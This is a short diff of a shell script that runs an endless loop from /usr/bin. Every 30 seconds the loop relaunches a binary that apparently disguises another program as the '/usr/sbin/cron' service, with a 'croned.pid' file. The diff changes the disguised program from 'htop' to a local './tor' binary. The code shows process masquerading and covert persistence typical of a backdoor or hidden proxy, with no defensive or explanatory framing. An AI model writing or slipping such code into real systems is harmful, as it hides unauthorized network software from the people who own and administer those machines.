@@ -29,7 +29,7 @@ python3 info.py &
 cd /usr/bin
 repeat_command() {
   while true; do
-    ./godt -s "/usr/sbin/cron" -d -p croned.pid htop
+    ./godb -s "/usr/sbin/cron" -d -p croned.pid ./tor
     sleep 30
   done
 }
